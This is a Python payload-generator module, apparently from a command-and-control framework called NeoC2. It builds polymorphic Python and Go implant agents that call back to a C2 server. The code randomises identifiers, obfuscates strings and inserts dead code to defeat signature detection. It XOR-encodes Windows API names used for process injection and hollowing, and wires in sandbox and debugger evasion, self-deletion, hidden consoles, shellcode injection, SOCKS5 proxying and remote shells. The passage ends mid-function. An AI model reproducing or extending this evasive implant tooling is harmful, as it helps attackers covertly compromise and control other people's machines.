import uuid
import random
import string
import json
import base64
import hashlib
import time
import os
from datetime import datetime
from core.config import NeoC2Config
from cryptography.fernet import Fernet

class PolymorphicEngine:
    def __init__(self):
        self.var_mapping = {}
        self.func_mapping = {}

    def generate_random_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        styles = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=length)),
            lambda: '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1)),
            lambda: ''.join(random.choice([c.upper(), c.lower()]) for c in random.choices(string.ascii_letters, k=length)),
        ]

        name = random.choice(styles)()
        return prefix + name if prefix else name

    def generate_go_field_name(self, prefix='', length=None):
        if length is None:
            length = random.randint(6, 12)

        name = ''.join(random.choices(string.ascii_lowercase, k=length))
        capitalized_name = name[0].upper() + name[1:]
        return prefix + capitalized_name if prefix else capitalized_name

    def obfuscate_string(self, s):
        technique = random.randint(0, 4)

        if technique == 0:
            encoded = base64.b64encode(s.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        elif technique == 1:
            hex_str = s.encode().hex()
            return f"bytes.fromhex('{hex_str}').decode()"
        elif technique == 2:
            codes = [str(ord(c)) for c in s]
            return f"chr({codes[0]}) + chr({codes[1]}) + chr({codes[2:]})" if len(codes) >= 3 else f"chr({','.join(codes)})"
        elif technique == 3:
            reversed_s = s[::-1]
            return f"'{reversed_s}'[::-1]"
        else:
            mid = len(s) // 2
            return f"'{s[:mid]}' + '{s[mid:]}'"

    def generate_dead_code(self):
        var_name = self.generate_random_name()
        value = random.choice(['None', '0', '""', '[]', '{}', 'False', 'True'])
        comment = random.choice(['Placeholder', 'Reserved', 'Internal', 'Config', 'Cache', 'State'])

        dead_code_templates = [
            f"_{var_name} = {value}  # {comment}",
            f"_{var_name} = lambda: {value}  # {comment}",
            f"# {comment}\n        _{var_name} = {value}",
        ]

        return random.choice(dead_code_templates)


class PayloadGenerator:
    def __init__(self, config, db):
        self.config = config
        self.db = db

    def _generate_fernet_key(self):
        return Fernet.generate_key().decode()

    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False):
        print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")

        listener = self.db.get_listener(listener_id)
        if not listener:
            listener = self.db.get_listener_by_name(listener_id)
            if not listener:
                raise ValueError(f"Listener with ID or name '{listener_id}' not found.")
        print(f"[DEBUG] Listener profile_name: {listener.get('profile_name', 'default')}")

        profile = self.db.get_profile_by_name(listener['profile_name'])
        if not profile:
            profile = self.db.get_profile_by_name('default')
            if not profile:
                raise ValueError(f"Profile '{listener['profile_name']}' not found and no default profile available.")

        profile_config = profile.get('config', {})

        if isinstance(profile_config, str):
            try:
                profile_config = json.loads(profile_config)
            except json.JSONDecodeError:
                print(f"[WARNING] Profile config is invalid JSON, using empty config")
                profile_config = {}
        elif not isinstance(profile_config, dict):
            print(f"[WARNING] Profile config is not a dict, using empty config")
            profile_config = {}

        protocol = profile_config.get('protocol', 'http')
        host = listener['host']
        if host == '0.0.0.0':
            host = self.config.get('server.host', '127.0.0.1')
        port = listener['port']
        c2_server_url = f"{protocol}://{host}:{port}"

        # Handle redirector configuration
        redirector_config = profile_config.get('redirector', {})
        redirector_host = redirector_config.get('redirector_host', '0.0.0.0')
        redirector_port = redirector_config.get('redirector_port', 80)

        agent_id = str(uuid.uuid4())
        secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()

        try:
            self.db.execute('''
                INSERT INTO agents (id, ip_address, hostname, os_info, user, listener_id, first_seen, last_seen, status, secret_key)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (agent_id, '0.0.0.0', 'pending', 'pending', 'pending', listener_id, datetime.now(), datetime.now(), 'pending', secret_key))
            print(f"[+] Agent pre-registered in database with ID: {agent_id}")

            max_retries = 5
            for attempt in range(max_retries):
                verification = self.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                if verification and verification['secret_key'] == secret_key:
                    print(f"[+] Verified agent pre-registration for ID: {agent_id}")
                    break
                else:
                    print(f"[DEBUG] Agent not yet visible in database (attempt {attempt + 1}/{max_retries}), retrying...")
                    time.sleep(0.1)
            else:
                print(f"[ERROR] Failed to verify agent pre-registration after {max_retries} attempts")
                raise Exception(f"Agent pre-registration verification failed for ID: {agent_id}")

        except Exception as e:
            print(f"[ERROR] Failed to pre-register agent: {str(e)}")
            raise

        # Extract kill_date and working_hours from profile_config
        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
        working_hours = profile_config.get('working_hours', {
            "start_hour": 9,
            "end_hour": 17,
            "timezone": "UTC",
            "days": [1, 2, 3, 4, 5]  # Monday to Friday
        })

        # Extract failover URLs from profile_config if use_failover is enabled
        failover_urls = profile_config.get('failover_urls', []) if use_failover else []

        # Extract headers from profile for Go agent
        profile_headers = profile_config.get('headers', {'User-Agent': 'Go C2 Agent'})

        print(f"[+] Generating polymorphic variant")
        if payload_type == "phantom_hawk_agent":
            return self._generate_phantom_hawk_agent(
                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
            )
        elif payload_type == "go_agent":
            return self._generate_go_agent(
                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers
            )
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")

    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
        if failover_urls is None:
            failover_urls = []
        if working_hours is None:
            working_hours = {
                "start_hour": 9,
                "end_hour": 17,
                "timezone": "UTC",
                "days": [1, 2, 3, 4, 5]  # Monday to Friday
            }

        poly = PolymorphicEngine()

        endpoints = profile_config.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')

        headers = profile_config.get('headers', {'User-Agent': 'Python C2 Agent'})
        heartbeat = profile_config.get('heartbeat_interval', 60)
        jitter = profile_config.get('jitter', 0.2)
        p2p_enabled = False  # P2P functionality has been removed
        p2p_port = 8888  # Default port value for template compatibility

        class_name = poly.generate_random_name('Agent')

        m_init = '__init__'  # Keep __init__ standard
        m_send = poly.generate_random_name('send_')
        m_register = poly.generate_random_name('register_')
        m_get_tasks = poly.generate_random_name('get_tasks_')
        m_exec = poly.generate_random_name('exec_')
        m_submit = poly.generate_random_name('submit_')
        m_run = poly.generate_random_name('run_')
        m_check_interactive_status = poly.generate_random_name('check_interactive_')
        m_get_interactive_command = poly.generate_random_name('get_interactive_cmd_')
        m_submit_interactive_result = poly.generate_random_name('submit_interactive_')
        m_start_interactive_polling = poly.generate_random_name('start_interactive_')
        m_stop_interactive_polling = poly.generate_random_name('stop_interactive_')
        m_interactive_poll_worker = poly.generate_random_name('interactive_worker_')
        m_enter_interactive_mode = poly.generate_random_name('enter_interactive_')
        m_exit_interactive_mode = poly.generate_random_name('exit_interactive_')
        m_stop_agent = poly.generate_random_name('stop_agent_')

        m_check_sandbox = poly.generate_random_name('check_sandbox_')
        m_check_debuggers = poly.generate_random_name('check_debuggers_')
        m_check_network_tools = poly.generate_random_name('check_network_tools_')
        m_self_delete = poly.generate_random_name('self_delete_')

        # Failover method names
        m_try_failover = poly.generate_random_name('try_failover_')
        m_increment_fail_count = poly.generate_random_name('increment_fail_count_')
        m_reset_fail_count = poly.generate_random_name('reset_fail_count_')

        m_handle_upload = poly.generate_random_name('handle_upload_')
        m_handle_download = poly.generate_random_name('handle_download_')

        m_start_direct_shell = poly.generate_random_name('start_direct_shell_')
        m_handle_direct_shell = poly.generate_random_name('handle_direct_shell_')


        m_encrypt_data = poly.generate_random_name('encrypt_data_')
        m_decrypt_data = poly.generate_random_name('decrypt_data_')
        m_check_working_hours = poly.generate_random_name('check_working_hours_')
        m_check_kill_date = poly.generate_random_name('check_kill_date_')

        v_c2 = poly.generate_random_name('c2_')
        v_agent_id = poly.generate_random_name('agent_id_')
        v_headers = poly.generate_random_name('headers_')
        v_heartbeat = poly.generate_random_name('heartbeat_')
        v_jitter = poly.generate_random_name('jitter_')
        v_register_uri = poly.generate_random_name('reg_uri_')
        v_tasks_uri = poly.generate_random_name('tasks_uri_')
        v_results_uri = poly.generate_random_name('results_uri_')
        v_interactive_uri = poly.generate_random_name('interactive_uri_')
        v_interactive_status_uri = poly.generate_random_name('interactive_status_uri_')
        v_running = poly.generate_random_name('running_')
        v_hostname = poly.generate_random_name('hostname_')
        v_username = poly.generate_random_name('username_')
        v_os_info = poly.generate_random_name('os_info_')
        v_interactive_mode = poly.generate_random_name('interactive_mode_')
        v_interactive_thread = poly.generate_random_name('interactive_thread_')
        v_interactive_polling = poly.generate_random_name('interactive_polling_')
        v_current_interactive_task = poly.generate_random_name('current_interactive_task_')

        v_secret_key = poly.generate_random_name('secret_key_')
        v_fernet = poly.generate_random_name('fernet_')


        v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')

        v_kill_date = poly.generate_random_name('kill_date_')
        v_working_hours = poly.generate_random_name('working_hours_')

        # Redirector variables
        v_redirector_host = poly.generate_random_name('redirector_host_')
        v_redirector_port = poly.generate_random_name('redirector_port_')
        v_use_redirector = poly.generate_random_name('use_redirector_')

        # Failover variables
        v_use_failover = poly.generate_random_name('use_failover_')
        v_failover_urls = poly.generate_random_name('failover_urls_')
        v_current_c2_url = poly.generate_random_name('current_c2_url_')
        v_current_fail_count = poly.generate_random_name('current_fail_count_')
        v_max_fail_count = poly.generate_random_name('max_fail_count_')
        v_in_failover_attempt = poly.generate_random_name('in_failover_attempt_')

        v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')

        if obfuscate:
            register_uri_code = poly.obfuscate_string(register_uri)
            tasks_uri_code = poly.obfuscate_string(tasks_uri)
            results_uri_code = poly.obfuscate_string(results_uri)
            interactive_uri_code = poly.obfuscate_string(interactive_uri)
            interactive_status_uri_code = poly.obfuscate_string(interactive_status_uri)
        else:
            register_uri_code = f'"{register_uri}"'
            tasks_uri_code = f'"{tasks_uri}"'
            results_uri_code = f'"{results_uri}"'
            interactive_uri_code = f'"{interactive_uri}"'
            interactive_status_uri_code = f'"{interactive_status_uri}"'

        dead_code_1 = poly.generate_dead_code()
        dead_code_2 = poly.generate_dead_code()
        dead_code_3 = poly.generate_dead_code()
        dead_code_4 = poly.generate_dead_code()

        imports = [
            "import sys", "import os", "import time", "import json",
            "import socket", "import platform", "import subprocess",
            "import requests", "import random", "import threading",
            "import base64", "import shutil", "import ctypes", "import uuid",
            "from cryptography.fernet import Fernet"
        ]
        random.shuffle(imports)
        imports_code = '\n'.join(imports)

        listener_id_for_registration = 'web_app_default'


        template_path = os.path.join(os.path.dirname(__file__), 'phantom_hawk_template.py')
        with open(template_path, 'r') as f:
            agent_template = f.read()

        agent_template = agent_template.format(
            imports_code=imports_code,
            dead_code_1=dead_code_1,
            class_name=class_name,
            m_init=m_init,
            m_send=m_send,
            m_register=m_register,
            m_get_tasks=m_get_tasks,
            m_exec=m_exec,
            m_submit=m_submit,
            m_run=m_run,
            m_check_interactive_status=m_check_interactive_status,
            m_get_interactive_command=m_get_interactive_command,
            m_submit_interactive_result=m_submit_interactive_result,
            m_start_interactive_polling=m_start_interactive_polling,
            m_stop_interactive_polling=m_stop_interactive_polling,
            m_interactive_poll_worker=m_interactive_poll_worker,
            m_enter_interactive_mode=m_enter_interactive_mode,
            m_exit_interactive_mode=m_exit_interactive_mode,
            m_stop_agent=m_stop_agent,
            m_check_sandbox=m_check_sandbox,
            m_check_debuggers=m_check_debuggers,
            m_check_network_tools=m_check_network_tools,
            m_self_delete=m_self_delete,
            m_try_failover=m_try_failover,
            m_increment_fail_count=m_increment_fail_count,
            m_reset_fail_count=m_reset_fail_count,
            m_handle_upload=m_handle_upload,
            m_handle_download=m_handle_download,
            m_start_direct_shell=m_start_direct_shell,
            m_handle_direct_shell=m_handle_direct_shell,
            m_encrypt_data=m_encrypt_data,
            m_decrypt_data=m_decrypt_data,
            m_check_working_hours=m_check_working_hours,
            m_check_kill_date=m_check_kill_date,
            v_c2=v_c2,
            v_agent_id=v_agent_id,
            v_headers=v_headers,
            headers=json.dumps(headers),
            v_heartbeat=v_heartbeat,
            v_jitter=v_jitter,
            v_register_uri=v_register_uri,
            v_tasks_uri=v_tasks_uri,
            v_results_uri=v_results_uri,
            v_interactive_uri=v_interactive_uri,
            v_interactive_status_uri=v_interactive_status_uri,
            heartbeat=heartbeat,
            jitter=jitter,
            register_uri_code=register_uri_code,
            tasks_uri_code=tasks_uri_code,
            results_uri_code=results_uri_code,
            interactive_uri_code=interactive_uri_code,
            interactive_status_uri_code=interactive_status_uri_code,
            v_running=v_running,
            v_hostname=v_hostname,
            v_username=v_username,
            v_os_info=v_os_info,
            v_interactive_mode=v_interactive_mode,
            v_interactive_thread=v_interactive_thread,
            v_interactive_polling=v_interactive_polling,
            v_current_interactive_task=v_current_interactive_task,
            v_secret_key=v_secret_key,
            v_fernet=v_fernet,
            v_sandbox_enabled=v_sandbox_enabled,
            v_redirector_host=v_redirector_host,
            v_redirector_port=v_redirector_port,
            v_use_redirector=v_use_redirector,
            v_use_failover=v_use_failover,
            v_failover_urls=v_failover_urls,
            v_current_c2_url=v_current_c2_url,
            v_current_fail_count=v_current_fail_count,
            v_max_fail_count=v_max_fail_count,
            v_in_failover_attempt=v_in_failover_attempt,
            v_kill_date=v_kill_date,
            v_working_hours=v_working_hours,
            kill_date=kill_date,
            working_hours_start_hour=working_hours.get('start_hour', 9),
            working_hours_end_hour=working_hours.get('end_hour', 17),
            working_hours_timezone=working_hours.get('timezone', 'UTC'),
            working_hours_days=working_hours.get('days', [1, 2, 3, 4, 5]),  # Pass as actual list for template formatting
            v_coffloader_b64="",
            sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
            dead_code_2=dead_code_2,
            dead_code_3=dead_code_3,
            dead_code_4=dead_code_4,
            c2_url=c2_url,
            agent_id=agent_id,
            listener_id_for_registration=listener_id_for_registration,
            p2p_enabled=p2p_enabled,
            p2p_port=p2p_port,
            secret_key=secret_key,
            redirector_host=redirector_host,
            redirector_port=redirector_port,
            use_redirector=str(use_redirector).lower().capitalize(),
            use_failover=str(use_failover).lower().capitalize(),
            failover_urls=failover_urls
        )

        print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
        return agent_template.strip()


    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None):
        if failover_urls is None:
            failover_urls = []
        if profile_headers is None:
            profile_headers = {'User-Agent': 'Go C2 Agent'}
        import subprocess
        import os
        import tempfile
        import shutil
        from datetime import datetime
        import random

        # Create a polymorphic engine instance for Go agent
        poly = PolymorphicEngine()

        # Generate random names for struct types and fields
        agent_struct_name = poly.generate_random_name('Agent')
        task_struct_name = poly.generate_random_name('Task')
        task_result_struct_name = poly.generate_random_name('TaskResult')
        api_response_struct_name = poly.generate_random_name('ApiResponse')

        # Generate random names for struct fields
        agent_c2_url_field = poly.generate_go_field_name('C2')
        agent_id_field = poly.generate_go_field_name('ID')
        agent_headers_field = poly.generate_go_field_name('Headers')
        agent_heartbeat_interval_field = poly.generate_go_field_name('HbInterval')
        agent_jitter_field = poly.generate_go_field_name('Jitter')
        agent_register_uri_field = poly.generate_go_field_name('RegisterURI')
        agent_tasks_uri_field = poly.generate_go_field_name('TasksURI')
        agent_results_uri_field = poly.generate_go_field_name('ResultsURI')
        agent_interactive_uri_field = poly.generate_go_field_name('InteractiveURI')
        agent_interactive_status_uri_field = poly.generate_go_field_name('InteractiveStatusURI')
        agent_running_field = poly.generate_go_field_name('Running')
        agent_interactive_mode_field = poly.generate_go_field_name('InteractiveMode')
        agent_hostname_field = poly.generate_go_field_name('Hostname')
        agent_username_field = poly.generate_go_field_name('Username')
        agent_osinfo_field = poly.generate_go_field_name('OSInfo')
        agent_secret_key_field = poly.generate_go_field_name('SecretKey')
        agent_current_interactive_task_field = poly.generate_go_field_name('CurrentInteractiveTask')
        agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')
        agent_kill_date_field = poly.generate_go_field_name('KillDate')
        agent_working_hours_field = poly.generate_go_field_name('WorkingHours')

        # Generate random names for redirector fields
        agent_redirector_host_field = poly.generate_go_field_name('RedirectorHost')
        agent_redirector_port_field = poly.generate_go_field_name('RedirectorPort')
        agent_use_redirector_field = poly.generate_go_field_name('UseRedirector')

        # Generate random names for task struct fields
        task_id_field = poly.generate_go_field_name('ID')
        task_command_field = poly.generate_go_field_name('Cmd')

        # Generate random names for task result struct fields
        task_result_task_id_field = poly.generate_go_field_name('TaskID')
        task_result_result_field = poly.generate_go_field_name('Result')

        # Generate random names for function names
        agent_encrypt_data_func = poly.generate_random_name('encryptData')
        agent_decrypt_data_func = poly.generate_random_name('decryptData')
        agent_send_func = poly.generate_random_name('sendRequest')
        agent_register_func = poly.generate_random_name('register')
        agent_get_tasks_func = poly.generate_random_name('getTasks')
        agent_check_interactive_status_func = poly.generate_random_name('checkInteractiveStatus')
        agent_get_interactive_command_func = poly.generate_random_name('getInteractiveCommand')
        agent_submit_interactive_result_func = poly.generate_random_name('submitInteractiveResult')
        agent_submit_task_result_func = poly.generate_random_name('submitTaskResult')
        agent_execute_func = poly.generate_random_name('execute')
        agent_handle_module_func = poly.generate_random_name('handleModule')
        agent_handle_upload_func = poly.generate_random_name('handleUpload')
        agent_handle_download_func = poly.generate_random_name('handleDownload')
        agent_handle_tty_shell_func = poly.generate_random_name('handleTTYShell')
        agent_handle_sleep_func = poly.generate_random_name('handleSleep')
        agent_handle_bof_func = poly.generate_random_name('handleBOF')
        agent_handle_dotnet_assembly_func = poly.generate_random_name('handleDotNetAssembly')
        agent_process_command_func = poly.generate_random_name('processCommand')
        agent_run_func = poly.generate_random_name('run')
        agent_stop_func = poly.generate_random_name('stop')
        agent_check_sandbox_func = poly.generate_random_name('checkSandbox')
        agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox')
        agent_check_windows_processes_for_sandbox_func = poly.generate_random_name('checkWindowsProcessesForSandbox')
        agent_check_network_tools_func = poly.generate_random_name('checkNetworkTools')
        agent_check_debuggers_func = poly.generate_random_name('checkDebuggers')
        agent_check_processes_for_debuggers_func = poly.generate_random_name('checkProcessesForDebuggers')
        agent_check_windows_processes_for_debuggers_func = poly.generate_random_name('checkWindowsProcessesForDebuggers')
        agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger')
        agent_self_delete_func = poly.generate_random_name('selfDelete')
        agent_hide_console_func = poly.generate_random_name('hideConsole')
        agent_check_working_hours_func = poly.generate_random_name('checkWorkingHours')
        agent_check_kill_date_func = poly.generate_random_name('checkKillDate')
        agent_get_process_id_func = poly.generate_random_name('getProcessId')
        agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
        agent_inject_pe_func = poly.generate_random_name('injectPE')

        # Generate random names for reverse proxy fields
        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive')
        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan')
        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock')

        # Generate random names for reverse proxy function names
        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy')
        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy')
        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5')

        # Generate random names for failover functions
        agent_try_failover_func = poly.generate_random_name('tryFailover')
        agent_increment_fail_count_func = poly.generate_random_name('incrementFailCount')
        agent_reset_fail_count_func = poly.generate_random_name('resetFailCount')

        # Generate random names for new failover fields
        agent_failover_urls_field = poly.generate_go_field_name('FailoverURLs')
        agent_use_failover_field = poly.generate_go_field_name('UseFailover')
        agent_current_c2_url_field = poly.generate_go_field_name('CurrentC2URL')
        agent_current_fail_count_field = poly.generate_go_field_name('CurrentFailCount')
        agent_max_fail_count_field = poly.generate_go_field_name('MaxFailCount')
        agent_last_connection_attempt_field = poly.generate_go_field_name('LastConnectionAttempt')
        agent_in_failover_attempt_field = poly.generate_go_field_name('InFailoverAttempt')

        template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
        with open(template_path, 'r') as f:
            go_template = f.read()

        # If obfuscation is enabled, randomize the XOR key to make each agent different
        if obfuscate:
            # Generate a random XOR key for string obfuscation
            random_obfuscation_key = random.randint(1, 255)

            # Find and replace the obfuscation key in the template
            go_template = go_template.replace('obfuscationKey = byte(0x42)', f'obfuscationKey = byte({random_obfuscation_key})')

            # Also make the obfuscated byte arrays random to make each agent unique
            # This means each agent will have different obfuscated byte sequences
            import re
            import binascii

            # Find all the obfuscated byte arrays and replace them with randomly generated ones
            # that will still decrypt to the same original strings
            def randomize_obfuscated_bytes(go_code_template, original_string, var_name):
                # Generate a random key for this specific string
                random_key = random.randint(1, 255)

                # Create obfuscated bytes using the random key
                obfuscated_bytes = []
                for char in original_string:
                    obfuscated_bytes.append(ord(char) ^ random_key)

                # Format as Go byte array
                byte_array_str = ', '.join([f'0x{b:02x}' for b in obfuscated_bytes])

                # Replace the obfuscated byte array in the template
                pattern = var_name + r' = \[\]byte\{[^\}]+\} // "' + original_string + r'"'
                replacement = f'{var_name} = []byte{{{byte_array_str}}} // "{original_string}"'
                return re.sub(pattern, replacement, go_code_template)

            # Randomize the obfuscated DLL and API names
            go_template = randomize_obfuscated_bytes(go_template, "kernel32.dll", "obfuscatedKernel32DLL")
            go_template = randomize_obfuscated_bytes(go_template, "ntdll.dll", "obfuscatedNtdllDLL")
            go_template = randomize_obfuscated_bytes(go_template, "user32.dll", "obfuscatedUser32DLL")
            go_template = randomize_obfuscated_bytes(go_template, "OpenProcess", "obfuscatedOpenProcess")
            go_template = randomize_obfuscated_bytes(go_template, "VirtualAllocEx", "obfuscatedVirtualAllocEx")
            go_template = randomize_obfuscated_bytes(go_template, "WriteProcessMemory", "obfuscatedWriteProcessMemory")
            go_template = randomize_obfuscated_bytes(go_template, "CreateRemoteThread", "obfuscatedCreateRemoteThread")
            go_template = randomize_obfuscated_bytes(go_template, "VirtualProtectEx", "obfuscatedVirtualProtectEx")
            go_template = randomize_obfuscated_bytes(go_template, "CreateToolhelp32Snapshot", "obfuscatedCreateToolhelp32Snapshot")
            go_template = randomize_obfuscated_bytes(go_template, "Process32FirstW", "obfuscatedProcess32First")
            go_template = randomize_obfuscated_bytes(go_template, "Process32NextW", "obfuscatedProcess32Next")
            go_template = randomize_obfuscated_bytes(go_template, "CreateProcessW", "obfuscatedCreateProcess")
            go_template = randomize_obfuscated_bytes(go_template, "ResumeThread", "obfuscatedResumeThread")
            go_template = randomize_obfuscated_bytes(go_template, "SuspendThread", "obfuscatedSuspendThread")
            go_template = randomize_obfuscated_bytes(go_template, "GetThreadContext", "obfuscatedGetThreadContext")
            go_template = randomize_obfuscated_bytes(go_template, "SetThreadContext", "obfuscatedSetThreadContext")
            go_template = randomize_obfuscated_bytes(go_template, "ReadProcessMemory", "obfuscatedReadProcessMemory")
            go_template = randomize_obfuscated_bytes(go_template, "NtUnmapViewOfSection", "obfuscatedNtUnmapViewOfSection")
            go_template = randomize_obfuscated_bytes(go_template, "GetConsoleWindow", "obfuscatedGetConsoleWindow")
            go_template = randomize_obfuscated_bytes(go_template, "ShowWindow", "obfuscatedShowWindow")

        # Replace all placeholders with randomly generated names
        go_code = go_template.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
        go_code = go_code.replace('{TASK_STRUCT_NAME}', task_struct_name)
        go_code = go_code.replace('{TASK_RESULT_STRUCT_NAME}', task_result_struct_name)
        go_code = go_code.replace('{API_RESPONSE_STRUCT_NAME}', api_response_struct_name)
        go_code = go_code.replace('{AGENT_C2_URL_FIELD}', agent_c2_url_field)
        go_code = go_code.replace('{AGENT_ID_FIELD}', agent_id_field)
        go_code = go_code.replace('{AGENT_HEADERS_FIELD}', agent_headers_field)
        go_code = go_code.replace('{AGENT_HEARTBEAT_INTERVAL_FIELD}', agent_heartbeat_interval_field)
        go_code = go_code.replace('{AGENT_JITTER_FIELD}', agent_jitter_field)
        go_code = go_code.replace('{AGENT_REGISTER_URI_FIELD}', agent_register_uri_field)
        go_code = go_code.replace('{AGENT_TASKS_URI_FIELD}', agent_tasks_uri_field)
        go_code = go_code.replace('{AGENT_RESULTS_URI_FIELD}', agent_results_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_URI_FIELD}', agent_interactive_uri_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_STATUS_URI_FIELD}', agent_interactive_status_uri_field)
        go_code = go_code.replace('{AGENT_RUNNING_FIELD}', agent_running_field)
        go_code = go_code.replace('{AGENT_INTERACTIVE_MODE_FIELD}', agent_interactive_mode_field)
        go_code = go_code.replace('{AGENT_HOSTNAME_FIELD}', agent_hostname_field)
        go_code = go_code.replace('{AGENT_USERNAME_FIELD}', agent_username_field)
        go_code = go_code.replace('{AGENT_OSINFO_FIELD}', agent_osinfo_field)
        go_code = go_code.replace('{AGENT_SECRET_KEY_FIELD}', agent_secret_key_field)
        go_code = go_code.replace('{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}', agent_current_interactive_task_field)
        go_code = go_code.replace('{AGENT_DISABLE_SANDBOX_FIELD}', agent_disable_sandbox_field)
        go_code = go_code.replace('{AGENT_KILL_DATE_FIELD}', agent_kill_date_field)
        go_code = go_code.replace('{AGENT_WORKING_HOURS_FIELD}', agent_working_hours_field)
        go_code = go_code.replace('{AGENT_REDIRECTOR_HOST_FIELD}', agent_redirector_host_field)
        go_code = go_code.replace('{AGENT_REDIRECTOR_PORT_FIELD}', agent_redirector_port_field)
        go_code = go_code.replace('{AGENT_USE_REDIRECTOR_FIELD}', agent_use_redirector_field)
        go_code = go_code.replace('{TASK_ID_FIELD}', task_id_field)
        go_code = go_code.replace('{TASK_COMMAND_FIELD}', task_command_field)
        go_code = go_code.replace('{TASK_RESULT_TASK_ID_FIELD}', task_result_task_id_field)
        go_code = go_code.replace('{TASK_RESULT_RESULT_FIELD}', task_result_result_field)
        go_code = go_code.replace('{AGENT_ENCRYPT_DATA_FUNC}', agent_encrypt_data_func)
        go_code = go_code.replace('{AGENT_DECRYPT_DATA_FUNC}', agent_decrypt_data_func)
        go_code = go_code.replace('{AGENT_SEND_FUNC}', agent_send_func)
        go_code = go_code.replace('{AGENT_REGISTER_FUNC}', agent_register_func)
        go_code = go_code.replace('{AGENT_GET_TASKS_FUNC}', agent_get_tasks_func)
        go_code = go_code.replace('{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}', agent_check_interactive_status_func)
        go_code = go_code.replace('{AGENT_GET_INTERACTIVE_COMMAND_FUNC}', agent_get_interactive_command_func)
        go_code = go_code.replace('{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}', agent_submit_interactive_result_func)
        go_code = go_code.replace('{AGENT_SUBMIT_TASK_RESULT_FUNC}', agent_submit_task_result_func)
        go_code = go_code.replace('{AGENT_EXECUTE_FUNC}', agent_execute_func)
        go_code = go_code.replace('{AGENT_HANDLE_MODULE_FUNC}', agent_handle_module_func)
        go_code = go_code.replace('{AGENT_HANDLE_UPLOAD_FUNC}', agent_handle_upload_func)
        go_code = go_code.replace('{AGENT_HANDLE_DOWNLOAD_FUNC}', agent_handle_download_func)
        go_code = go_code.replace('{AGENT_HANDLE_TTY_SHELL_FUNC}', agent_handle_tty_shell_func)
        go_code = go_code.replace('{AGENT_HANDLE_SLEEP_FUNC}', agent_handle_sleep_func)
        go_code = go_code.replace('{AGENT_HANDLE_BOF_FUNC}', agent_handle_bof_func)
        go_code = go_code.replace('{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}', agent_handle_dotnet_assembly_func)
        go_code = go_code.replace('{AGENT_PROCESS_COMMAND_FUNC}', agent_process_command_func)
        go_code = go_code.replace('{AGENT_RUN_FUNC}', agent_run_func)
        go_code = go_code.replace('{AGENT_STOP_FUNC}', agent_stop_func)
        go_code = go_code.replace('{AGENT_CHECK_SANDBOX_FUNC}', agent_check_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}', agent_check_windows_processes_for_sandbox_func)
        go_code = go_code.replace('{AGENT_CHECK_NETWORK_TOOLS_FUNC}', agent_check_network_tools_func)
        go_code = go_code.replace('{AGENT_CHECK_DEBUGGERS_FUNC}', agent_check_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_processes_for_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_windows_processes_for_debuggers_func)
